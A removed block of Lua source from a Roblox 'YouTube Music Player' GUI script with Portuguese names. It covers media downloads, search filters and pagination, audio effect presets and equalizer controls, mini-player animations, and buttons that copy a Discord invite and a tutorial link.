-		DownloadFrameTexto.Text = "<font color=\"rgb(255,255,255)\">" .. Traducao.ErroTitle .. "</font>\n" .. "<font color=\"rgb(192,192,192)\">" .. Traducao.ErroText .. "</font>"
-		return
-	end
-
-	local str11 = "YouTube Music Player/" .. (arg == "Video" and "Videos" or "Musics")
-	local str12 = arg == "Video" and ".webm" or ".mp3"
-	local str13 = str11 .. "/" .. tostring(v18) .. str12
-
-	pcall(function()
-		if not isfolder(str11) then
-			makefolder(str11)
-		end
-
-		writefile(str13, v21)
-	end)
-
-	task.wait(1)
-	UpdatePlaylist()
-	CarregandoRoblox(false)
-	DesativarBusca(false)
-	Concluido.Visible = true
-
-	if not frame.Visible or not Tela4.Visible then
-		fn3(Traducao.Baixado, Traducao.Terminou, 10)
-	end
-
-	DownloadFrameTexto.Text = "<font color=\"rgb(255,255,255)\">" .. Traducao.Baixado .. "</font>\n" .. "<font color=\"rgb(192,192,192)\">" .. Traducao.Terminou .. "</font>"
-end
-
-for i = 1, 10 do
-	local imageButton3 = Instance.new("ImageButton")
-	imageButton3.Size = UDim2.new(0, 21, 0, 21)
-	imageButton3.Position = UDim2.new(0, 3 + (i - 1) * 28, 0, 3)
-	imageButton3.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-	imageButton3.BackgroundTransparency = 0.9
-	imageButton3.Name = i
-	imageButton3.Parent = ScrollPagina
-	local textLabel = Instance.new("TextLabel")
-	textLabel.Size = UDim2.new(1, 0, 1, 0)
-	textLabel.Position = UDim2.new(0, 0, 0, 0)
-	textLabel.TextColor3 = Color3.fromRGB(20, 20, 20)
-	textLabel.BackgroundTransparency = 1
-	textLabel.BorderSizePixel = 0
-	textLabel.Text = tostring(i)
-	textLabel.Parent = imageButton3
-	Corner(imageButton3, 20)
-	Stroke(imageButton3, 50, 50, 50, 1)
-	local uiStroke = imageButton3:FindFirstChildOfClass("UIStroke")
-
-	if i == 1 then
-		imageButton3.BackgroundTransparency = 0
-		imageButton3.BackgroundColor3 = Color3.fromRGB(139, 0, 0)
-		textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-
-		if uiStroke then
-			uiStroke.Color = Color3.fromRGB(255, 0, 0)
-		end
-	end
-
-	imageButton3.MouseButton1Click:Connect(function()
-		if i == tbl.Pagina then
-			return
-		end
-
-		if not flag19 then
-			fn3(Traducao.OpcaoBloqueadaTitle, Traducao.OpcaoBloqueadaText, 10)
-			return
-		end
-
-		if Loading.Visible or Baixando.Visible then
-			return
-		end
-		SetPag(i)
-		Concluido.Visible = false
-		DownloadFrameTexto.Visible = false
-		SemResultado.Visible = false
-		Erro.Visible = false
-		Tutorial.Visible = false
-		Novamente.Visible = false
-		Buscar(text)
-	end)
-end
-
-AplicarFiltro.MouseButton1Click:Connect(function()
-	if not flag19 then
-		fn3(Traducao.OpcaoBloqueadaTitle, Traducao.OpcaoBloqueadaText, 10)
-		return
-	end
-
-	if not PaginaFrame.Visible then
-		fn3(Traducao.Erro, Traducao.NaoPodeFiltro, 10)
-		return
-	end
-	tbl.Ordem = ordem
-	tbl.Data = data
-	tbl.Duracao = duracao
-	DownloadFrameTexto.Visible = false
-	SemResultado.Visible = false
-	Erro.Visible = false
-	Tutorial.Visible = false
-	Novamente.Visible = false
-	Formato.Visible = false
-	ScrollDownload.Visible = true
-	TextoTituloFor.Text = ""
-	Thumbfor.Image = "rbxassetid://0"
-	SetPag(1)
-	Buscar(text)
-end)
-
-RemoverFiltro.MouseButton1Click:Connect(function()
-	if not flag19 then
-		fn3(Traducao.OpcaoBloqueadaTitle, Traducao.OpcaoBloqueadaText, 10)
-		return
-	end
-
-	if ordem == "relevance" and data == "any" and duracao == "any" then
-		fn3(Traducao.Erro, Traducao.FiltrosJaPadrao, 10)
-		return
-	end
-	ordem = "relevance"
-	data = "any"
-	duracao = "any"
-	tbl.Ordem = ordem
-	tbl.Data = data
-	tbl.Duracao = duracao
-	RelevanciaTexto.Text = Traducao.Order .. "\n" .. Traducao.Relevance
-	DataUploadTexto.Text = Traducao.UploaDate .. "\n" .. Traducao.Any
-	DuracaoTexto.Text = Traducao.Duration .. "\n" .. Traducao.Any
-	DownloadFrameTexto.Visible = false
-	SemResultado.Visible = false
-	Erro.Visible = false
-	Tutorial.Visible = false
-	Novamente.Visible = false
-	fn3(Traducao.Sucesso, Traducao.FiltrosRemovidos, 5)
-
-	if PaginaFrame.Visible then
-		Formato.Visible = false
-		ScrollDownload.Visible = true
-		TextoTituloFor.Text = ""
-		Thumbfor.Image = "rbxassetid://0"
-		SetPag(1)
-		Buscar(text)
-	end
-end)
-
-Relevancia.MouseButton1Click:Connect(function()
-	for i, v18 in ipairs(tbl2) do
-		if v18 == ordem then
-			ordem = tbl2[i % #tbl2 + 1]
-			break
-		end
-	end
-
-	RelevanciaTexto.Text = Traducao.Order .. "\n" .. Traducao[ordem:gsub("^%l", string.upper)]
-end)
-
-DataUpload.MouseButton1Click:Connect(function()
-	for i, v18 in ipairs(tbl3) do
-		if v18 == data then
-			data = tbl3[i % #tbl3 + 1]
-			break
-		end
-	end
-
-	DataUploadTexto.Text = Traducao.UploaDate .. "\n" .. Traducao[data:gsub("^%l", string.upper)]
-end)
-
-Duracao.MouseButton1Click:Connect(function()
-	for i, v18 in ipairs(tbl4) do
-		if v18 == duracao then
-			duracao = tbl4[i % #tbl4 + 1]
-			break
-		end
-	end
-
-	DuracaoTexto.Text = Traducao.Duration .. "\n" .. Traducao[duracao:gsub("^%l", string.upper)]
-end)
-
-Filtro.MouseButton1Click:Connect(function()
-	if Loading.Visible or Baixando.Visible then
-		return
-	end
-
-	if not FiltroFrame.Visible then
-		tbl10 = {}
-
-		for _, v18 in ipairs({
-			DownloadFrameTexto,
-			Aguardando,
-			Loading,
-			SemResultado,
-			Formato,
-			ScrollDownload,
-			Concluido,
-			SemResultado,
-			Erro,
-		}) do
-			if v18.Visible then
-				table.insert(tbl10, v18)
-				v18.Visible = false
-			end
-		end
-
-		FiltroFrame.Visible = true
-	else
-		for _, v18 in ipairs(tbl10) do
-			if v18 then
-				v18.Visible = true
-			end
-		end
-
-		tbl10 = {}
-		FiltroFrame.Visible = false
-	end
-end)
-
-ClearSearch = function()
-	pcall(function()
-		if isfolder("Youtube Music Player/Internal/Cache") then
-			local Cache = listfiles("Youtube Music Player/Internal/Cache")
-
-			for _, v18 in ipairs(Cache) do
-				if string.find(v18, "Search_") then
-					delfile(v18)
-				end
-			end
-		end
-	end)
-end
-
-PesquisarBox.FocusLost:Connect(function()
-	local match = PesquisarBox.Text:match("^%s*(.-)%s*$")
-	if match == "" then
-		PesquisarBox.Text = ""
-		return
-	end
-	ClearSearch()
-	text = tostring(match)
-	SetPag(1)
-	Buscar(text)
-end)
-
-PesquisarBox.Focused:Connect(function()
-	CancelarBusca()
-end)
-
-Lupa.MouseButton1Down:Connect(function()
-	if not PesquisarBox.Active then
-		return
-	end
-	flag14 = PesquisarBox:IsFocused()
-end)
-
-Lupa.MouseButton1Click:Connect(function()
-	if not PesquisarBox.Active then
-		return
-	end
-
-	if flag14 then
-		PesquisarBox:ReleaseFocus()
-	else
-		PesquisarBox:CaptureFocus()
-	end
-end)
-
-BotaoMp3.MouseButton1Click:Connect(function()
-	if isfile("YouTube Music Player/Musics" .. "/" .. tostring(VIDEO_ATUAL) .. ".mp3") then
-		fn3(Traducao.Erro, Traducao.JaTemMusica, 5)
-		return
-	end
-	Baixar("Musica")
-	DownloadAtual = "M"
-end)
-
-BotaoMp4.MouseButton1Click:Connect(function()
-	if not flag19 then
-		fn3(Traducao.OpcaoBloqueadaTitle, Traducao.OpcaoBloqueadaText, 10)
-		return
-	end
-
-	if isfile("YouTube Music Player/Videos" .. "/" .. tostring(VIDEO_ATUAL) .. ".webm") then
-		fn3(Traducao.Erro, Traducao.JaTemVideo, 5)
-		return
-	end
-	Baixar("Video")
-	DownloadAtual = "V"
-end)
-
-BotaoCancelar.MouseButton1Click:Connect(function()
-	Formato.Visible = false
-	ScrollDownload.Visible = true
-	TextoTituloFor.Text = ""
-	Thumbfor.Image = "rbxassetid://0"
-end)
-
-Novamente.MouseButton1Click:Connect(function()
-	if DownloadAtual == "M" then
-		fn3(Traducao.Tentando, Traducao.TentandoTexto, 7)
-		Baixar("Musica")
-	elseif DownloadAtual == "V" then
-		fn3(Traducao.Tentando, Traducao.TentandoTexto, 7)
-		Baixar("Video")
-	end
-end)
-
-Tutorial.MouseButton1Click:Connect(function()
-	fn3(Traducao.LinkCopiado, Traducao.Tutorial, 8)
-	YmpClipboard("https://raw.githubusercontent.com/Dan41/Roblox-Scripts/refs/heads/main/Youtube%20Music%20Player/Tutorial.txt")
-end)
-
-ScrollDownload.ChildAdded:Connect(function(child)
-	if not child:IsA("Frame") then
-		return
-	end
-	organizarItens()
-end)
-
-ScrollDownload.ChildRemoved:Connect(function(child)
-	if not child:IsA("Frame") then
-		return
-	end
-	organizarItens()
-end)
-
-SetVolume = function(volume)
-	sound2.Volume = volume
-	Video.Volume = volume
-	MiniVideo.Volume = volume
-	VolumeBox.Text = tostring(volume)
-end
-
-SetPitch = function(playbackSpeed)
-	sound2.PlaybackSpeed = playbackSpeed
-	GiroSpeed = playbackSpeed
-	GiroBackup = playbackSpeed
-	PitchBox.Text = tostring(playbackSpeed)
-end
-
-SetEqualizer = function(lowGain, midGain, highGain)
-	Equalizer.LowGain = lowGain
-	Equalizer.MidGain = midGain
-	Equalizer.HighGain = highGain
-	GravesBox.Text = tostring(lowGain)
-	MediosBox.Text = tostring(midGain)
-	AgudosBox.Text = tostring(highGain)
-end
-
-EquaValue = function(arg, arg2)
-	local v18 = string.match(string.gsub(string.gsub(arg, "^%s+", ""), "%s+$", ""), "-?%d+%.?%d*")
-	if not v18 then
-		return arg2
-	end
-	local num = tonumber(v18)
-	if not num then
-		return arg2
-	end
-	return (math.clamp(num, -1000, 1000))
-end
-
-SetEffect = function(arg)
-	for _, child in pairs(sound2:GetChildren()) do
-		if child:IsA("SoundEffect") then
-			child:Destroy()
-		end
-	end
-
-	SetPitch(1)
-	SetEqualizer(1, 1, 1)
-	if arg == "Nenhum" then
-		return
-	end
-
-	if arg == "Reverb" then
-		local reverbSoundEffect = Instance.new("ReverbSoundEffect", sound2)
-		reverbSoundEffect.DecayTime = 2.6
-		reverbSoundEffect.Density = 0.75
-		reverbSoundEffect.Diffusion = 0.9
-		reverbSoundEffect.WetLevel = -9
-		reverbSoundEffect.DryLevel = 0
-		SetEqualizer(-1, 0, -3)
-	elseif arg == "Echo" then
-		local echoSoundEffect = Instance.new("EchoSoundEffect", sound2)
-		echoSoundEffect.Delay = 0.7
-		echoSoundEffect.Feedback = 0.5
-		echoSoundEffect.WetLevel = -6
-		echoSoundEffect.DryLevel = 0
-	elseif arg == "Distortion" then
-		Instance.new("DistortionSoundEffect", sound2).Level = 0.4
-		SetEqualizer(-4, 2, -2)
-	elseif arg == "Chorus" then
-		local chorusSoundEffect = Instance.new("ChorusSoundEffect", sound2)
-		chorusSoundEffect.Depth = 0.25
-		chorusSoundEffect.Rate = 1.2
-		chorusSoundEffect.Mix = 0.6
-	elseif arg == "Flanger" then
-		local flangeSoundEffect = Instance.new("FlangeSoundEffect", sound2)
-		flangeSoundEffect.Depth = 0.4
-		flangeSoundEffect.Rate = 2
-		flangeSoundEffect.Mix = 0.5
-	elseif arg == "Tremolo" then
-		local tremoloSoundEffect = Instance.new("TremoloSoundEffect", sound2)
-		tremoloSoundEffect.Depth = 0.5
-		tremoloSoundEffect.Frequency = 8
-	elseif arg == "Compressor" then
-		local compressorSoundEffect = Instance.new("CompressorSoundEffect", sound2)
-		compressorSoundEffect.Threshold = -25
-		compressorSoundEffect.Ratio = 15
-		compressorSoundEffect.Attack = 0.02
-		compressorSoundEffect.Release = 0.1
-	elseif arg == "Radio" then
-		Instance.new("DistortionSoundEffect", sound2).Level = 0.25
-		local compressorSoundEffect = Instance.new("CompressorSoundEffect", sound2)
-		compressorSoundEffect.Threshold = -10
-		compressorSoundEffect.Ratio = 12
-		compressorSoundEffect.Attack = 0.02
-		compressorSoundEffect.Release = 0.08
-		local equalizerSoundEffect = Instance.new("EqualizerSoundEffect", sound2)
-		equalizerSoundEffect.LowGain = -10
-		equalizerSoundEffect.MidGain = 10
-		equalizerSoundEffect.HighGain = -12
-		SetPitch(0.97)
-	elseif arg == "Cinema" then
-		local reverbSoundEffect = Instance.new("ReverbSoundEffect", sound2)
-		reverbSoundEffect.DecayTime = 5
-		reverbSoundEffect.Density = 0.7
-		reverbSoundEffect.WetLevel = -15
-		reverbSoundEffect.DryLevel = 0
-		SetEqualizer(6, -2, 2)
-	elseif arg == "Underwater" then
-		local reverbSoundEffect = Instance.new("ReverbSoundEffect", sound2)
-		reverbSoundEffect.DecayTime = 1.5
-		reverbSoundEffect.Density = 1
-		reverbSoundEffect.WetLevel = -6
-		reverbSoundEffect.DryLevel = -4
-		SetEqualizer(4, -12, -25)
-	elseif arg == "Kid" then
-		SetPitch(1.45)
-		SetEqualizer(-5, 2, 4)
-	elseif arg == "Robot" then
-		local flangeSoundEffect = Instance.new("FlangeSoundEffect", sound2)
-		flangeSoundEffect.Depth = 0.5
-		flangeSoundEffect.Rate = 3
-		local tremoloSoundEffect = Instance.new("TremoloSoundEffect", sound2)
-		tremoloSoundEffect.Depth = 1
-		tremoloSoundEffect.Frequency = 4
-		SetEqualizer(-5, 5, 2)
-	elseif arg == "Slowed" then
-		SetPitch(0.72)
-		Instance.new("DistortionSoundEffect", sound2).Level = 0.35
-		local reverbSoundEffect = Instance.new("ReverbSoundEffect", sound2)
-		reverbSoundEffect.DecayTime = 4
-		reverbSoundEffect.WetLevel = -10
-		SetEqualizer(8, -2, -12)
-	end
-end
-
-SelecionarEqua = function(arg)
-	local children = ScrollEqua:GetChildren()
-
-	local function fn14(arg2)
-		if not arg2:IsA("ImageButton") or arg2.Name == "Resetar" then
-			return
-		end
-		local imageLabel = arg2:FindFirstChildOfClass("ImageLabel")
-		arg2.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-		Stroke(arg2, 50, 50, 50, 2)
-
-		if imageLabel then
-			Stroke(imageLabel, 50, 50, 50, 2)
-		end
-	end
-
-	for _, child in ipairs(children) do
-		fn14(child)
-	end
-
-	local imageLabel = arg:FindFirstChildOfClass("ImageLabel")
-	arg.BackgroundColor3 = Color3.fromRGB(139, 0, 0)
-	Stroke(arg, 255, 0, 0, 2)
-
-	if imageLabel then
-		Stroke(imageLabel, 255, 0, 0, 2)
-	end
-
-	if arg.Name == "Nenhum" then
-		SetEffect("Nenhum")
-	elseif arg.Name == "Reverb" then
-		SetEffect("Reverb")
-	elseif arg.Name == "Echo" then
-		SetEffect("Echo")
-	elseif arg.Name == "Distortion" then
-		SetEffect("Distortion")
-	elseif arg.Name == "Chorus" then
-		SetEffect("Chorus")
-	elseif arg.Name == "Flanger" then
-		SetEffect("Flanger")
-	elseif arg.Name == "Tremolo" then
-		SetEffect("Tremolo")
-	elseif arg.Name == "Compressor" then
-		SetEffect("Compressor")
-	elseif arg.Name == "Radio" then
-		SetEffect("Radio")
-	elseif arg.Name == "Cinema" then
-		SetEffect("Cinema")
-	elseif arg.Name == "Underwater" then
-		SetEffect("Underwater")
-	elseif arg.Name == "Kid" then
-		SetEffect("Kid")
-	elseif arg.Name == "Robot" then
-		SetEffect("Robot")
-	elseif arg.Name == "Slowed" then
-		SetEffect("Slowed")
-	end
-end
-
-VolumeBox.FocusLost:Connect(function()
-	SetVolume(EquaValue(VolumeBox.Text, 1))
-end)
-
-PitchBox.FocusLost:Connect(function()
-	SetPitch(EquaValue(PitchBox.Text, 1))
-end)
-
-GravesBox.FocusLost:Connect(function()
-	local v18 = EquaValue
-	local text2 = AgudosBox.Text
-	SetEqualizer(EquaValue(GravesBox.Text, 1), EquaValue(MediosBox.Text, 1), v18(text2, 1))
-end)
-
-MediosBox.FocusLost:Connect(function()
-	local v18 = EquaValue
-	local text2 = AgudosBox.Text
-	SetEqualizer(EquaValue(GravesBox.Text, 1), EquaValue(MediosBox.Text, 1), v18(text2, 1))
-end)
-
-AgudosBox.FocusLost:Connect(function()
-	local v18 = EquaValue
-	local text2 = AgudosBox.Text
-	SetEqualizer(EquaValue(GravesBox.Text, 1), EquaValue(MediosBox.Text, 1), v18(text2, 1))
-end)
-
-for _, child in ipairs(ScrollEqua:GetChildren()) do
-	if child:IsA("ImageButton") and child.Name ~= "Resetar" then
-		child.MouseButton1Click:Connect(function()
-			SelecionarEqua(child)
-		end)
-	end
-end
-
-ResetarEqua.MouseButton1Click:Connect(function()
-	SetVolume(1)
-	SetPitch(1)
-	SelecionarEqua(Nenhum)
-	fn3(Traducao.Sucesso, Traducao.RsetadoEqua, 5)
-end)
-
-NumeroGC = function(arg)
-	if arg == false then
-		ContadorJA.Visible = false
-		ContadorJABO.Visible = false
-		ContadorJANU.Text = "0"
-		ContadorJANUBO.Text = "0"
-		return
-	end
-
-	ContadorJA.Visible = not flag17
-	ContadorJABO.Visible = true
-	local text2 = ContadorJANUBO.Text
-	if text2 == "9+" then
-		return
-	end
-	local n8 = tonumber(text2) or 1
-
-	if n8 < 9 then
-		local n9 = n8 + 1
-		ContadorJANU.Text = tostring(n9)
-		ContadorJANUBO.Text = tostring(n9)
-	else
-		ContadorJANU.Text = "9+"
-		ContadorJANUBO.Text = "9+"
-	end
-end
-
-if websocket_ then
-	Botao5.BackgroundTransparency = 0
-	Icone5.BackgroundTransparency = 0
-	Icone5.ImageTransparency = 0
-	Nome5.TextColor3 = Color3.fromRGB(255, 255, 255)
-	Stroke(Nome5, 0, 0, 0, 1.5)
-end
-
-Tela = function(arg)
-	if arg == n then
-		return
-	end
-	local tbl13 = { Tela1, Tela2, Tela3, Tela4, Tela5, Tela6 }
-	local v18 = ScrollNave:FindFirstChild("Botao" .. arg)
-	if arg == 5 and v18 and v18.BackgroundTransparency > 0 then
-		fn3(Traducao.Erro, Traducao.ExploitIcomGC, 5)
-		return
-	end
-	n = arg
-
-	if arg == 5 then
-		NumeroGC(false)
-	end
-
-	for i = 1, #tbl13 do
-		tbl13[i].Visible = false
-	end
-
-	fn2("102702078778790")
-
-	for _, child in ipairs(ScrollNave:GetChildren()) do
-		if child:IsA("ImageButton") then
-			child.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-			local uiStroke = child:FindFirstChild("UIStroke")
-
-			if uiStroke then
-				uiStroke.Color = Color3.fromRGB(50, 50, 50)
-			end
-
-			local imageLabel = child:FindFirstChildWhichIsA("ImageLabel")
-
-			if imageLabel then
-				local uiStroke2 = imageLabel:FindFirstChild("UIStroke")
-
-				if uiStroke2 then
-					uiStroke2.Color = Color3.fromRGB(50, 50, 50)
-				end
-			end
-		end
-	end
-
-	if tbl13[arg] then
-		tbl13[arg].Visible = true
-	end
-
-	if v18 then
-		local color = Color3.fromRGB(139, 0, 0)
-		local color2 = Color3.fromRGB(255, 0, 0)
-
-		if arg == 6 then
-			color = Color3.fromRGB(255, 215, 0)
-			color2 = Color3.fromRGB(184, 134, 11)
-		end
-
-		v18.BackgroundColor3 = color
-		local uiStroke = v18:FindFirstChild("UIStroke")
-
-		if uiStroke then
-			uiStroke.Color = color2
-		end
-
-		local imageLabel = v18:FindFirstChildWhichIsA("ImageLabel")
-
-		if imageLabel then
-			local uiStroke2 = imageLabel:FindFirstChild("UIStroke")
-
-			if uiStroke2 then
-				uiStroke2.Color = color2
-			end
-		end
-	end
-end
-
-Botao1.MouseButton1Click:Connect(function()
-	Tela(1)
-end)
-
-Botao2.MouseButton1Click:Connect(function()
-	Tela(2)
-end)
-
-Botao3.MouseButton1Click:Connect(function()
-	Tela(3)
-end)
-
-Botao4.MouseButton1Click:Connect(function()
-	Tela(4)
-end)
-
-Botao5.MouseButton1Click:Connect(function()
-	Tela(5)
-end)
-
-Botao6.MouseButton1Click:Connect(function()
-	Tela(6)
-end)
-
-Discord.MouseButton1Click:Connect(function()
-	if flag3 then
-		return
-	end
-	flag3 = true
-	local tween4 = v6:Create(UIScaleDis, tweenInfo, { Scale = 0.9 })
-	local tween5 = v6:Create(IconeDiscord, tweenInfo, { Rotation = -6 })
-	tween4:Play()
-	tween5:Play()
-	tween4.Completed:Wait()
-	local tween6 = v6:Create(UIScaleDis, tweenInfo2, { Scale = 1 })
-	local tween7 = v6:Create(IconeDiscord, tweenInfo2, { Rotation = 0 })
-	tween6:Play()
-	tween7:Play()
-	fn3(Traducao.LinkCopiado, "https://discord.gg/kbh2dEdnYP", 10)
-	YmpClipboard("https://discord.gg/kbh2dEdnYP")
-	tween6.Completed:Wait()
-	flag3 = false
-end)
-
-You.MouseButton1Click:Connect(function()
-	if flag4 then
-		return
-	end
-	flag4 = true
-	local tween4 = v6:Create(UIScaleYou, tweenInfo, { Scale = 0.9 })
-	local tween5 = v6:Create(IconeYou, tweenInfo, { Rotation = -6 })
-	tween4:Play()
-	tween5:Play()
-	tween4.Completed:Wait()
-	local tween6 = v6:Create(UIScaleYou, tweenInfo2, { Scale = 1 })
-	local tween7 = v6:Create(IconeYou, tweenInfo2, { Rotation = 0 })
-	tween6:Play()
-	tween7:Play()
-	fn3("YouTube", "@Termux_404", 10)
-	tween6.Completed:Wait()
-	flag4 = false
-end)
-
-local tbl13 = {}
-local tween4 = v6:Create(TempoAtual, tweenInfo4, { Position = UDim2.new(0, 6, 0, 6) })
-local tween5 = v6:Create(TempoTotal, tweenInfo4, { Position = UDim2.new(0, 174, 0, 6) })
-local tween6 = v6:Create(Repetir, tweenInfo4, { Position = UDim2.new(0.5, -35, 0.5, -54) })
-local tween7 = v6:Create(Miniplayer, tweenInfo4, { Position = UDim2.new(0.5, 5, 0.5, -54) })
-local create = v6.Create
-local v18 = BarraProgresso
-local tbl14 = { Position = UDim2.new(0, 6, 0, 103) }
-tbl13[1] = tween4
-tbl13[2] = tween5
-tbl13[3] = tween6
-tbl13[4] = tween7
-
-do
-	local values = table.pack(create(v6, v18, tweenInfo4, tbl14))
-	table.move(values, 1, values.n, 5, tbl13)
-end
-
-tweensMostrar = tbl13
-local tbl15 = {}
-local tween8 = v6:Create(TempoAtual, tweenInfo4, { Position = UDim2.new(0, -60, 0, 6) })
-local tween9 = v6:Create(TempoTotal, tweenInfo4, { Position = UDim2.new(0, 235, 0, 6) })
-local tween10 = v6:Create(Repetir, tweenInfo4, { Position = UDim2.new(0.5, -35, 0.5, -120) })
-local tween11 = v6:Create(Miniplayer, tweenInfo4, { Position = UDim2.new(0.5, 5, 0.5, -120) })
-local create2 = v6.Create
-local v19 = BarraProgresso
-local tbl16 = { Position = UDim2.new(0, 6, 0, 125) }
-tbl15[1] = tween8
-tbl15[2] = tween9
-tbl15[3] = tween10
-tbl15[4] = tween11
-
-do
-	local values = table.pack(create2(v6, v19, tweenInfo4, tbl16))
-	table.move(values, 1, values.n, 5, tbl15)
-end
-
-tweensOcultar = tbl15
-infoTweenMini = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
-listaControlesMini = { MiniBack, MiniRetroceder, MiniPlay, MiniAvancar, MiniSkip, TelaCheia, FecharMini }
-
-Exibir = function()
-	if flag6 then
-		return
-	end
-	flag6 = true
-	fn2("123430321654900")
-	task.wait(0.1)
-	flag5 = not flag5
-	local v20 = flag5 and tweensMostrar or tweensOcultar
-
-	for _, v21 in ipairs(v20) do
-		v21:Play()
-	end
-
-	v20[1].Completed:Wait()
-	flag6 = false
-end
-
-BotaoTela.MouseButton1Click:Connect(function()
-	Exibir()
-end)
-
-Repetir.MouseButton1Click:Connect(function()
-	if Repetir.Image == "rbxassetid://72571947341676" then
-		Repetir.Image = "rbxassetid://133261841375114"
-		fn3(Traducao.PlayMode, Traducao.Repetir, 8)
-		str4 = "nill"
-		sound2.Looped = true
-		Video.Looped = true
-		MiniVideo.Looped = true
-	elseif Repetir.Image == "rbxassetid://133261841375114" then
-		Repetir.Image = "rbxassetid://70388482182322"
-		fn3(Traducao.PlayMode, Traducao.Random, 8)
-		str4 = "Random"
-		sound2.Looped = false
-		Video.Looped = false
-		MiniVideo.Looped = false
-	else
-		Repetir.Image = "rbxassetid://72571947341676"
-		fn3(Traducao.PlayMode, Traducao.Auto, 8)
-		str4 = "Auto"
-		sound2.Looped = false
-		Video.Looped = false
-		MiniVideo.Looped = false
-	end
-end)
-
-Miniplayer.MouseButton1Click:Connect(function()
-	if not flag19 then
-		fn3(Traducao.OpcaoBloqueadaTitle, Traducao.OpcaoBloqueadaText, 10)
-		return
-	end
-
-	if BloquearMidia then
-		fn3(Traducao.Aguarde, Traducao.DownloadFazendo, 5)
-		return
-	end
-
-	if Miniplayer.Image == "rbxassetid://102723588572082" then
-		Miniplayer.Image = "rbxassetid://84519235983477"
-		fn2("85730811347567")
-		SetMiniPlayer(true)
-	elseif Miniplayer.Image == "rbxassetid://84519235983477" then
-		Miniplayer.Image = "rbxassetid://102723588572082"
-		fn2("85730811347567")
-		SetMiniPlayer(false)
-	end
-end)
-
-aplicarVisibilidadeMini = function(arg)
-	flag11 = true
-	local n8 = #listaControlesMini
-
-	for _, v20 in ipairs(listaControlesMini) do
-		if arg then
-			v20.Visible = true
-		end
-
-		local tbl17 = {}
-
-		if v20:IsA("ImageButton") or v20:IsA("ImageLabel") then
-			tbl17.ImageTransparency = arg and 0 or 1
-		end
-
-		if v20:IsA("TextButton") or v20:IsA("TextLabel") then
-			tbl17.TextTransparency = arg and 0 or 1
-		end
-
-		if v20.BackgroundTransparency ~= nil then
-			tbl17.BackgroundTransparency = arg and 0 or 1
-		end
-
-		local tween12 = v6:Create(v20, infoTweenMini, tbl17)
-		tween12:Play()
-
-		tween12.Completed:Once(function()
-			n8 -= 1
-
-			if not arg then
-				v20.Visible = false
-			end
-
-			if n8 <= 0 then
-				flag11 = false
-			end
-		end)
-	end
-end
-
-imageButton2.MouseButton1Click:Connect(function()
-	if flag11 then
-		return
-	end
-
-	if imageButton2:GetAttribute("Blocked") then
-		return
-	end
-
-	if imageButton2:GetAttribute("Moved") then
-		imageButton2:SetAttribute("Moved", false)
-		return
-	end
-	estadoMiniUI = not estadoMiniUI
-	aplicarVisibilidadeMini(estadoMiniUI)
-end)
-
-imageButton.MouseButton1Click:Connect(function()
-	if imageButton:GetAttribute("Blocked") then
-		return
-	end
-
-	if imageButton:GetAttribute("Moved") then
-		imageButton:SetAttribute("Moved", false)
-		return
-	end
-	imageButton.Visible = false
-	frame.Visible = true
-
-	if Tela5.Visible then
-		NumeroGC(false)
-	end
-
-	fn2("122954374321453")
-end)
-
-BotaoFechar.MouseButton1Click:Connect(function()
-	frame.Visible = false
-	task.wait(0.2)
-	imageButton.Visible = true
-end)
-
-animar = function(arg)
-	if tbl8[arg] then
-		return
-	end
-	tbl8[arg] = true
-	local size = arg.Size
-	local position = arg.Position
-
-	if tbl9[arg] then
-		for _, v20 in ipairs(tbl9[arg]) do
-			v20:Cancel()
-		end
-	end
-
-	tbl9[arg] = {}
-	fn2("136328893130485")
-	local tween12 = v6:Create(arg, tweenInfo5, { Size = size - UDim2.new(0, 6, 0, 6), Position = position + UDim2.new(0, 3, 0, 3) })
-	local tween13 = v6:Create(arg, tweenInfo6, { Size = size, Position = position })
-	local tween14 = v6:Create(arg, TweenInfo.new(0.05), { Rotation = 6 })
-	local tween15 = v6:Create(arg, TweenInfo.new(0.05), { Rotation = -6 })
-	local tween16 = v6:Create(arg, TweenInfo.new(0.05), { Rotation = 0 })
-	table.insert(tbl9[arg], tween12)
-	table.insert(tbl9[arg], tween13)
-	table.insert(tbl9[arg], tween14)
-	table.insert(tbl9[arg], tween15)
-	table.insert(tbl9[arg], tween16)
-	tween12:Play()
-	tween12.Completed:Wait()
-	tween13:Play()
-	tween14:Play()
-	tween14.Completed:Wait()
-	tween15:Play()
-	tween15.Completed:Wait()
-	tween16:Play()
-	tween16.Completed:Wait()
-	tbl8[arg] = nil
-end
-
-FecharMini.MouseButton1Click:Connect(function()
-	fn2("85730811347567")
-	Miniplayer.Image = "rbxassetid://102723588572082"
-	SetMiniPlayer(false)
-end)
-
-Voltar.MouseButton1Click:Connect(function()
-	Back()
-	animar(Voltar)
-end)
-
-Retroceder.MouseButton1Click:Connect(function()
-	Retroceder10s()
-	animar(Retroceder)
-end)
-
-Play.MouseButton1Click:Connect(function()
-	Pause()
-	animar(Play)
-end)
-
-Adiantar.MouseButton1Click:Connect(function()
-	Avancar10s()
-	animar(Adiantar)
-end)
-
-Pular.MouseButton1Click:Connect(function()
-	Skip()
-	animar(Pular)
-end)
-
-MiniBack.MouseButton1Click:Connect(function()
-	Back()
-	animar(MiniBack)
-end)
-
-MiniRetroceder.MouseButton1Click:Connect(function()
-	Retroceder10s()
-	animar(MiniRetroceder)
-end)
-
-MiniPlay.MouseButton1Click:Connect(function()
-	Pause()
-	animar(MiniPlay)
-end)
-
-MiniAvancar.MouseButton1Click:Connect(function()
-	Avancar10s()
-	animar(MiniAvancar)
-end)
-
-MiniSkip.MouseButton1Click:Connect(function()
-	Skip()
-	animar(MiniSkip)
-end)
-
-TelaCheia.MouseButton1Click:Connect(function()
-	if isAnimating then
-		return
-	end
-	isAnimating = true
-	flag10 = not flag10
-	local udim24
-
-	if flag10 then
-		udim24 = UDim2.new(udim2.X.Scale * 1.4, 0, udim2.Y.Scale * 1.4, 0)
-		TelaCheia.Image = "rbxassetid://104681366724942"
-		fn2("125296945528316")
-		MiniBack.Size = UDim2.new(0.18, -8, 0.29, 0)
-		MiniRetroceder.Size = UDim2.new(0.18, -8, 0.29, 0)
-		MiniPlay.Size = UDim2.new(0.18, -8, 0.29, 0)
-		MiniAvancar.Size = UDim2.new(0.18, -8, 0.29, 0)
-		MiniSkip.Size = UDim2.new(0.18, -8, 0.29, 0)
